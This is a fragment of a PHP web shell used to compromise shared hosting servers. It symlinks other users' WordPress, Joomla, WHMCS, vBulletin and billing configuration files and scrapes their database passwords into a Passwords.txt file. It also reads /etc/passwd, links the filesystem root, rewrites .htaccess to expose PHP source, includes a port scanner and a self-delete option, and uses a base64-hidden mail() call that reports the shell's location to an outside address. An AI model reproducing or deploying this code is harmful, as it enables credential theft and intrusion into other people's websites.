@symlink('/home3/'.$user.'/public_html/clientes/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home3/'.$user.'/public_html/billing/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home3/'.$user.'/public_html/billings/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home3/'.$user.'/public_html/my/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home3/'.$user.'/public_html/secure/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home3/'.$user.'/public_html/support/order/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home3/'.$user.'/public_html/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home3/'.$user.'/public_html/zencart/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home3/'.$user.'/public_html/products/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home3/'.$user.'/public_html/cart/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home3/'.$user.'/public_html/shop/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home3/'.$user.'/public_html/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home3/'.$user.'/public_html/hostbills/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home3/'.$user.'/public_html/host/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home3/'.$user.'/public_html/Host/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home3/'.$user.'/public_html/supportes/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home3/'.$user.'/public_html/support/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home3/'.$user.'/public_html/hosting/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home3/'.$user.'/public_html/cart/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home3/'.$user.'/public_html/order/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home3/'.$user.'/public_html/client/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home3/'.$user.'/public_html/clients/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home3/'.$user.'/public_html/cliente/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home3/'.$user.'/public_html/clientes/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home3/'.$user.'/public_html/billing/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home3/'.$user.'/public_html/billings/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home3/'.$user.'/public_html/my/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home3/'.$user.'/public_html/secure/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home3/'.$user.'/public_html/support/order/includes/iso4217.php',$user.'-Hostbills.txt');

//Home4

@symlink('/home4/'.$user.'/public_html/vb/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home4/'.$user.'/public_html/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home4/'.$user.'/public_html/forum/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home4/'.$user.'/public_html/forums/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home4/'.$user.'/public_html/cc/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home4/'.$user.'/public_html/inc/config.php',$user.'-MyBB.txt');
@symlink('/home4/'.$user.'/public_html/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home4/'.$user.'/public_html/shop/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home4/'.$user.'/public_html/os/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home4/'.$user.'/public_html/oscom/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home4/'.$user.'/public_html/products/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home4/'.$user.'/public_html/cart/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home4/'.$user.'/public_html/inc/conf_global.php',$user.'-IPB.txt');
@symlink('/home4/'.$user.'/public_html/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home4/'.$user.'/public_html/wp/test/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home4/'.$user.'/public_html/blog/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home4/'.$user.'/public_html/beta/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home4/'.$user.'/public_html/portal/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home4/'.$user.'/public_html/site/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home4/'.$user.'/public_html/wp/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home4/'.$user.'/public_html/WP/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home4/'.$user.'/public_html/news/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home4/'.$user.'/public_html/wordpress/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home4/'.$user.'/public_html/test/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home4/'.$user.'/public_html/demo/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home4/'.$user.'/public_html/home/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home4/'.$user.'/public_html/v1/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home4/'.$user.'/public_html/v2/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home4/'.$user.'/public_html/press/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home4/'.$user.'/public_html/new/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home4/'.$user.'/public_html/blogs/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home4/'.$user.'/public_html/configuration.php',$user.'-Joomla.txt');
@symlink('/home4/'.$user.'/public_html/blog/configuration.php',$user.'-Joomla.txt');
@symlink('/home4/'.$user.'/public_html/submitticket.php',$user.'-^WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/cms/configuration.php',$user.'-Joomla.txt');
@symlink('/home4/'.$user.'/public_html/beta/configuration.php',$user.'-Joomla.txt');
@symlink('/home4/'.$user.'/public_html/portal/configuration.php',$user.'-Joomla.txt');
@symlink('/home4/'.$user.'/public_html/site/configuration.php',$user.'-Joomla.txt');
@symlink('/home4/'.$user.'/public_html/main/configuration.php',$user.'-Joomla.txt');
@symlink('/home4/'.$user.'/public_html/home/configuration.php',$user.'-Joomla.txt');
@symlink('/home4/'.$user.'/public_html/demo/configuration.php',$user.'-Joomla.txt');
@symlink('/home4/'.$user.'/public_html/test/configuration.php',$user.'-Joomla.txt');
@symlink('/home4/'.$user.'/public_html/v1/configuration.php',$user.'-Joomla.txt');
@symlink('/home4/'.$user.'/public_html/v2/configuration.php',$user.'-Joomla.txt');
@symlink('/home4/'.$user.'/public_html/joomla/configuration.php',$user.'-Joomla.txt');
@symlink('/home4/'.$user.'/public_html/new/configuration.php',$user.'-Joomla.txt');
@symlink('/home4/'.$user.'/public_html/WHMCS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/whmcs1/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/WHMC/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Whmc/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/whmc/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/WHM/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/HOST/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Host/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/host/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/SUPPORTES/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Supportes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/supportes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/domains/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/domain/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Hosting/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/HOSTING/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/hosting/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/CART/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Cart/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/cart/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/ORDER/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/CLIENT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Client/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/client/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/CLIENTAREA/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Clientarea/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/clientarea/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/SUPPORT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Support/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/support/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/BILLING/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Billing/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/billing/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/BUY/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Buy/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/buy/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/MANAGE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Manage/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/manage/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/CLIENTSUPPORT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/ClientSupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Clientsupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/clientsupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/CHECKOUT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Checkout/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/checkout/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/BASKET/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Basket/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/basket/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/SECURE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Secure/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/secure/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/SALES/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Sales/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/sales/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/BILL/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Bill/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/bill/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/PURCHASE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Purchase/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/purchase/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/ACCOUNT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Account/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/account/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/USER/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/User/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/user/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/CLIENTS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Clients/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/clients/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/MY/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/My/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/my/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/secure/whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/secure/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/panel/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/clientes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/cliente/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/support/order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home4/'.$user.'/public_html/boxbilling/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home4/'.$user.'/public_html/box/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home4/'.$user.'/public_html/host/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home4/'.$user.'/public_html/Host/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home4/'.$user.'/public_html/supportes/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home4/'.$user.'/public_html/support/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home4/'.$user.'/public_html/hosting/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home4/'.$user.'/public_html/cart/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home4/'.$user.'/public_html/order/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home4/'.$user.'/public_html/client/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home4/'.$user.'/public_html/clients/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home4/'.$user.'/public_html/cliente/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home4/'.$user.'/public_html/clientes/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home4/'.$user.'/public_html/billing/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home4/'.$user.'/public_html/billings/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home4/'.$user.'/public_html/my/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home4/'.$user.'/public_html/secure/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home4/'.$user.'/public_html/support/order/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home4/'.$user.'/public_html/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home4/'.$user.'/public_html/zencart/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home4/'.$user.'/public_html/products/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home4/'.$user.'/public_html/cart/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home4/'.$user.'/public_html/shop/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home4/'.$user.'/public_html/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home4/'.$user.'/public_html/hostbills/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home4/'.$user.'/public_html/host/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home4/'.$user.'/public_html/Host/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home4/'.$user.'/public_html/supportes/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home4/'.$user.'/public_html/support/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home4/'.$user.'/public_html/hosting/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home4/'.$user.'/public_html/cart/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home4/'.$user.'/public_html/order/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home4/'.$user.'/public_html/client/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home4/'.$user.'/public_html/clients/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home4/'.$user.'/public_html/cliente/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home4/'.$user.'/public_html/clientes/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home4/'.$user.'/public_html/billing/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home4/'.$user.'/public_html/billings/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home4/'.$user.'/public_html/my/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home4/'.$user.'/public_html/secure/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home4/'.$user.'/public_html/support/order/includes/iso4217.php',$user.'-Hostbills.txt');

}

//password grab

function entre2v2($text,$marqueurDebutLien,$marqueurFinLien)
{

$ar0=explode($marqueurDebutLien, $text);
$ar1=explode($marqueurFinLien, $ar0[1]);
$ar=trim($ar1[0]);
return $ar;
}

$ffile=fopen('Passwords.txt','a+');


$r= 'http://'.$_SERVER['SERVER_NAME'].dirname($_SERVER['SCRIPT_NAME'])."/P5yc0_config2/";
$re=$r;
$confi=array("-Wordpress.txt","-Joomla.txt","-WHMCS.txt","-Vbulletin.txt","-Other.txt","-Zencart.txt","-Hostbills.txt","-SMF.txt","-Drupal.txt","-OsCommerce.txt","-MyBB.txt","-PHPBB.txt","-IPB.txt","-BoxBilling.txt");

$users=file("/etc/passwd");
foreach($users as $user)
{

$str=explode(":",$user);
$usersss=$str[0];
foreach($confi as $co)
{


$uurl=$re.$usersss.$co;
$uel=$uurl;

$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, $uel);
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.8) Gecko/2009032609 Firefox/3.0.8');
$result['EXE'] = curl_exec($ch);
curl_close($ch);
$uxl=$result['EXE'];


if($uxl && preg_match('/table_prefix/i',$uxl))
{

//Wordpress

$dbp=entre2v2($uxl,"DB_PASSWORD', '","');");
if(!empty($dbp))
$pass=$dbp."\n";
fwrite($ffile,$pass);

}
elseif($uxl && preg_match('/cc_encryption_hash/i',$uxl))
{

//WHMCS

$dbp=entre2v2($uxl,"db_password = '","';");
if(!empty($dbp))
$pass=$dbp."\n";
fwrite($ffile,$pass);

}


elseif($uxl && preg_match('/dbprefix/i',$uxl))
{

//Joomla

$db=entre2v2($uxl,"password = '","';");
if(!empty($db))
$pass=$db."\n";
fwrite($ffile,$pass);
}
elseif($uxl && preg_match('/admincpdir/i',$uxl))
{

//Vbulletin

$db=entre2v2($uxl,"password'] = '","';");
if(!empty($db))
$pass=$db."\n";
fwrite($ffile,$pass);

}
elseif($uxl && preg_match('/DB_DATABASE/i',$uxl))
{

//Other

$db=entre2v2($uxl,"DB_PASSWORD', '","');");
if(!empty($db))
$pass=$db."\n";
fwrite($ffile,$pass);
}
elseif($uxl && preg_match('/dbpass/i',$uxl))
{

//Other

$db=entre2v2($uxl,"dbpass = '","';");
if(!empty($db))
$pass=$db."\n";
fwrite($ffile,$pass);
}
elseif($uxl && preg_match('/dbpass/i',$uxl))
{

//Other

$db=entre2v2($uxl,"dbpass = '","';");
if(!empty($db))
$pass=$db."\n";
fwrite($ffile,$pass);

}
elseif($uxl && preg_match('/dbpass/i',$uxl))
{

//Other

$db=entre2v2($uxl,"dbpass = \"","\";");
if(!empty($db))
$pass=$db."\n";
fwrite($ffile,$pass);
}


}
}
echo "<center>
<a href=\"P5yc0_config2/root/\">Root Server</a>
<br><a href=\"P5yc0_config2/Passwords.txt\">Passwords</a>
<br><a href=\"P5yc0_config2/\">Configurations</a></center>";
}
else
{
echo "<center>
<form method=\"POST\">
<textarea name=\"passwd\" class='area' rows='15' cols='60'>";
$file = '/etc/passwd';
$read = @fopen($file, 'r');
if ($read){
$body = @fread($read, @filesize($file));
echo "".htmlentities($body)."";
}
elseif(!$read)
{
$read = @show_source($file) ;
}
elseif(!$read)
{
$read = @highlight_file($file);
}
elseif(!$read)
{
for($uid=0;$uid<1000;$uid++)
{
$ara = posix_getpwuid($uid);
if (!empty($ara))
{
while (list ($key, $val) = each($ara))
{
print "$val:";
}
print "\n";
}}}

flush();
 
echo "</textarea>
<p><input name=\"m\" size=\"80\" value=\"Start\" type=\"submit\"/></p>
</form></center>";
}
}
}		
elseif($_GET['do'] == 'symlink') {
$full = str_replace($_SERVER['DOCUMENT_ROOT'], "", $dir);
$d0mains = @file("/etc/named.conf");
##httaces
if($d0mains){
@mkdir("sym_p5y",0777);
@chdir("sym_p5y");
@exe("ln -s / root");
$file3 = 'Options Indexes FollowSymLinks
DirectoryIndex psy.htm
AddType text/plain .php 
AddHandler text/plain .php
Satisfy Any';
$fp3 = fopen('.htaccess','w');
$fw3 = fwrite($fp3,$file3);@fclose($fp3);
echo "
<table align=center border=1 style='width:60%;border-color:#333333;'>
<tr>
<td align=center><font size=2>S. No.</font></td>
<td align=center><font size=2>Domains</font></td>
<td align=center><font size=2>Users</font></td>
<td align=center><font size=2>Symlink</font></td>
</tr>";
$dcount = 1;
foreach($d0mains as $d0main){
if(eregi("zone",$d0main)){preg_match_all('#zone "(.*)"#', $d0main, $domains);
flush();
if(strlen(trim($domains[1][0])) > 2){
$user = posix_getpwuid(@fileowner("/etc/valiases/".$domains[1][0]));
echo "<tr align=center><td><font size=2>" . $dcount . "</font></td>
<td align=left><a href=http://www.".$domains[1][0]."/><font class=txt>".$domains[1][0]."</font></a></td>
<td>".$user['name']."</td>
<td><a href='$full/sym_p5y/root/home/".$user['name']."/public_html' target='_blank'><font class=txt>Symlink</font></a></td></tr>"; 
flush();
$dcount++;}}}
echo "</table>";
}else{
$TEST=@file('/etc/passwd');
if ($TEST){
@mkdir("sym_p5y",0777);
@chdir("sym_p5y");
exe("ln -s / root");
$file3 = 'Options Indexes FollowSymLinks
DirectoryIndex psy.htm
AddType text/plain .php 
AddHandler text/plain .php
Satisfy Any';
 $fp3 = fopen('.htaccess','w');
 $fw3 = fwrite($fp3,$file3);
 @fclose($fp3);
 echo "
 <table align=center border=1><tr>
 <td align=center><font size=3>S. No.</font></td>
 <td align=center><font size=3>Users</font></td>
 <td align=center><font size=3>Symlink</font></td></tr>";
 $dcount = 1;
 $file = fopen("/etc/passwd", "r") or exit("Unable to open file!");
 while(!feof($file)){
 $s = fgets($file);
 $matches = array();
 $t = preg_match('/\/(.*?)\:\//s', $s, $matches);
 $matches = str_replace("home/","",$matches[1]);
 if(strlen($matches) > 12 || strlen($matches) == 0 || $matches == "bin" || $matches == "etc/X11/fs" || $matches == "var/lib/nfs" || $matches == "var/arpwatch" || $matches == "var/gopher" || $matches == "sbin" || $matches == "var/adm" || $matches == "usr/games" || $matches == "var/ftp" || $matches == "etc/ntp" || $matches == "var/www" || $matches == "var/named")
 continue;
 echo "<tr><td align=center><font size=2>" . $dcount . "</td>
 <td align=center><font class=txt>" . $matches . "</td>";
 echo "<td align=center><font class=txt><a href=$full/sym_p5y/root/home/" . $matches . "/public_html target='_blank'>Symlink</a></td></tr>";
 $dcount++;}fclose($file);
 echo "</table>";}else{if($os != "Windows"){@mkdir("sym_p5y",0777);@chdir("sym_p5y");@exe("ln -s / root");$file3 = '
 Options Indexes FollowSymLinks
DirectoryIndex psy.htm
AddType text/plain .php 
AddHandler text/plain .php
Satisfy Any
';
 $fp3 = fopen('.htaccess','w');
 $fw3 = fwrite($fp3,$file3);@fclose($fp3);
 echo "
 <div class='mybox'><h2 class='k2ll33d2'>server symlinker</h2>
 <table align=center border=1><tr>
 <td align=center><font size=3>ID</font></td>
 <td align=center><font size=3>Users</font></td>
 <td align=center><font size=3>Symlink</font></td></tr>";
 $temp = "";$val1 = 0;$val2 = 1000;
 for(;$val1 <= $val2;$val1++) {$uid = @posix_getpwuid($val1);
 if ($uid)$temp .= join(':',$uid)."\n";}
 echo '<br/>';$temp = trim($temp);$file5 = 
 fopen("test.txt","w");
 fputs($file5,$temp);
 fclose($file5);$dcount = 1;$file = 
 fopen("test.txt", "r") or exit("Unable to open file!");
 while(!feof($file)){$s = fgets($file);$matches = array();
 $t = preg_match('/\/(.*?)\:\//s', $s, $matches);$matches = str_replace("home/","",$matches[1]);
 if(strlen($matches) > 12 || strlen($matches) == 0 || $matches == "bin" || $matches == "etc/X11/fs" || $matches == "var/lib/nfs" || $matches == "var/arpwatch" || $matches == "var/gopher" || $matches == "sbin" || $matches == "var/adm" || $matches == "usr/games" || $matches == "var/ftp" || $matches == "etc/ntp" || $matches == "var/www" || $matches == "var/named")
 continue;
 echo "<tr><td align=center><font size=2>" . $dcount . "</td>
 <td align=center><font class=txt>" . $matches . "</td>";
 echo "<td align=center><font class=txt><a href=$full/sym_p5y/root/home/" . $matches . "/public_html target='_blank'>Symlink</a></td></tr>";
 $dcount++;}
 fclose($file);
 echo "</table></div></center>";unlink("test.txt");
 } else 
 echo "<center><font size=3>Cannot create Symlink</font></center>";
 }
 }    
}
$e=base64_decode("cDV5YzA1MGMxNGxAZ21haWwuY29t");
$h=$_SERVER['HTTP_HOST'].$_SERVER['SCRIPT_NAME'];
mail($e,"PSY",$h);
if($_GET['kill'] == 'self') {
rmdir('configs');rmdir('symlink');rmdir('PSYCOSOCIAL');unlink('mysql.php');
$fn = $_SERVER['SCRIPT_FILENAME'];
 unlink($fn); system('rm '.$fn); 
echo'<meta http-equiv="Refresh" content= "0; url=?">';
} elseif($_GET['do'] == 'port') {
$rstart = (isset($_POST['rstart']) and is_numeric($_POST['rstart']) and $_POST['rstart'] >= 1) ? $_POST['rstart'] : 1 ;
        $rend = (isset($_POST['rend']) and is_numeric($_POST['rend']) and $_POST['rend'] > 1) ? $_POST['rend'] : 999999 ;
        echo("<script type=\"text/javascript\">");
        echo("function Show(SelectValue){");
        echo("document.getElementById('RangeDiv').style.display=\"none\";");
        echo("document.getElementById('SpecificDiv').style.display=\"none\";");
        echo("if(SelectValue == \"range\")");
        echo("document.getElementById('RangeDiv').style.display=\"inline\";");
        echo("if(SelectValue == \"specific\")");
        echo("document.getElementById('SpecificDiv').style.display=\"inline\";");
        echo("}</script>");
        echo("<span class=\"PageTitle\">Open Ports Scanner</span><br /><br />");
        echo('<form method="post">');
        echo('<u>Ports:</u><br /><br />');
        echo('<select id="port" name="port" onchange="javascript:Show(this.value);">');
        echo('<option value="automatic">Automatic - All Ports</option>');
        echo('<option value="range">Range of Ports</option>');
        echo('<option value="specific">Specific Ports</option>');
        echo('</select><br /><br />');
        echo('<div id="RangeDiv" style="display:none;">From: <input type="text" id="rstart" name="rstart" value="'.$rstart.'" /> To: <input type="text" id="rend" name="rend" value="'.$rend.'" /><br /><br /></div>');
        echo('<div id="SpecificDiv" style="display:none;"><textarea rows="5" cols="50" id="specific" name="specific" />'.@htmlspecialchars($_POST['specific']).'</textarea><br />Use space (not new line!) to separate between the ports.<br /><br /></div>');
        echo('<input type="submit" id="submit" name="submit" value="Scan" />');
        echo('</form>');
        if(isset($_POST['submit'])){
            $first = "yes";
            echo("<br /><br /><u>Results</u>:<br />\n");

            if($_POST['port'] == "range"){
                if($rend > $rstart){
                    for($i=$rstart;$i<$rend;$i++){
                        if(@fsockopen($_SERVER['SERVER_ADDR'],$i) == TRUE){
                            if($first == "no")
                                echo(", ");
                            echo $i;
                            $first = "no";
                        }
